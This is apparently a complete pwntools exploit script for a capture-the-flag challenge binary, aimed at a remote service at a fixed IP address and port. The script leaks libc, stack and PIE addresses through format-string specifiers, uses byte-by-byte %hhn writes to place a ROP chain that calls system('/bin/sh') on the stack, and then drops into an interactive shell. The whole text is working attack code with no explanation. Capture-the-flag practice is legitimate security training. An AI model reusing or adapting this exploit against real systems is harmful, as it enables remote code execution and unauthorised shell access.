from pwn import *

if args.LOCAL:
    io=process('./chall')
    if args.GDB:
        cmd="""
        init-pwndbg
        b* vuln
        """
        gdb.attach(io, cmd)
    libc=ELF('./libc.so.6')
else:
    io=remote('34.70.212.151', 8008)
    libc=ELF('./libc.so.6')

elf=context.binary=ELF('./chall')
io.sendline(b'1')    


def write(byte, add):
    io.sendline(b'2')
    pl = '%{}c%8$hhn'.format(byte).ljust(16,'\0').encode()
    pl+=add
    io.sendline(pl)

io.recvuntil(b'Have this: ')
og=[0x54ed3, 0x11060a, 0x110612, 0x110617]
libc.address=int(io.recv(14), 16) - 0x81600
print(hex(libc.address))
target=0x1fe170+libc.address
one=og[0]+libc.address

io.sendline(b'2')
io.sendline(b'%12$llo_%13$llo')
io.recvuntil(b'Input\n>> ')
stack=int(io.recv(16), 8)
print(hex(stack))
io.recv(1)
pie=int(io.recv(16), 8) - 0x16c5
print(hex(pie))

target=stack-0xc+3
pl='%{}c%8$hhn'.format(0xff).ljust(16, '\0').encode()
pl+=p64(target)

io.sendline(b'2')
io.sendline(pl)

pop_rdi=libc.address+0x0000000000028715
pl=p64(pop_rdi+1)
pl+=p64(pop_rdi)
pl+=p64(next(libc.search(b'/bin/sh\0')))
pl+=p64(libc.sym.system)
pause()
for i in range(0, len(pl)//8, 1):
    for j in range(0, 6, 1):
        write(u8(pl[8*i+j:8*i+j+1]), p64(stack+8+i*8+j))
io.interactive()